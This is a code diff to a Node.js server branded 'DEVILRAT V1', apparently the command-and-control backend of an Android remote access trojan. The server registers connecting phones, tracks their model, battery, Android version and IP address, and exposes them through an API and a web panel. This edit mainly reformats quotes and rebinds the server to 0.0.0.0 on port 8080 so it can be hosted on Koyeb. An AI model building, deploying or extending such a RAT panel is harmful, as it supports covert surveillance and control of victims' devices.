@@ -1,7 +1,7 @@
-const express = require('express');
-const http = require('http');
-const socketIo = require('socket.io');
-const path = require('path');
+const express = require("express");
+const http = require("http");
+const socketIo = require("socket.io");
+const path = require("path");
 
 const app = express();
 const server = http.createServer(app);
@@ -13,28 +13,28 @@ const commands = [];
 
 // Middleware
 app.use(express.json());
-app.use(express.static('public'));
+app.use(express.static("public"));
 
 // API Routes
-app.get('/health', (req, res) => {
+app.get("/health", (req, res) => {
   res.json({
-    status: 'online',
-    service: 'DEVILRAT V1 - Docker',
+    status: "online",
+    service: "DEVILRAT V1 - Docker",
     devices: devices.size,
     uptime: process.uptime()
   });
 });
 
-app.get('/api/devices', (req, res) => {
+app.get("/api/devices", (req, res) => {
   res.json(Array.from(devices.values()));
 });
 
 // Web Panel
-app.get('/panel', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'panel.html'));
+app.get("/panel", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "panel.html"));
 });
 
-app.get('/', (req, res) => {
+app.get("/", (req, res) => {
   res.send(`
   <!DOCTYPE html>
   <html>
@@ -57,42 +57,42 @@ app.get('/', (req, res) => {
 });
 
 // Socket.IO
-io.on('connection', (socket) => {
-  console.log('New device connected:', socket.id);
-  
-  socket.on('register', (data) => {
+io.on("connection", (socket) => {
+  console.log("New device connected:", socket.id);
+
+  socket.on("register", (data) => {
     const device = {
       id: socket.id,
-      model: data.model || 'Unknown',
-      battery: data.battery || '100%',
-      android: data.android || 'Unknown',
+      model: data.model || "Unknown",
+      battery: data.battery || "100%",
+      android: data.android || "Unknown",
       ip: socket.handshake.address,
       connected: new Date().toISOString(),
-      status: 'online'
+      status: "online"
     };
-    
+
     devices.set(socket.id, device);
-    io.emit('device_update', device);
+    io.emit("device_update", device);
   });
-  
-  socket.on('disconnect', () => {
+
+  socket.on("disconnect", () => {
     const device = devices.get(socket.id);
     if (device) {
-      device.status = 'offline';
-      io.emit('device_update', device);
+      device.status = "offline";
+      io.emit("device_update", device);
       devices.delete(socket.id);
     }
   });
 });
 
-// Start server
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
+// ====== FIX UTAMA UNTUK KOYEB ======
+const PORT = process.env.PORT || 8080;
+
+// WAJIB 0.0.0.0
+server.listen(PORT, "0.0.0.0", () => {
   console.log(`
-  👹 DEVILRAT V1 - DOCKER EDITION
-  📡 Server running on port ${PORT}
-  🔗 Web Panel: http://localhost:${PORT}/panel
-  ⚡ WebSocket: ws://localhost:${PORT}
-  🛐 KEGELAPAN ABADI!
+👹 DEVILRAT V1 - KOYEB READY
+📡 Server running on port ${PORT}
+✅ Device should appear in Koyeb panel
   `);
 });
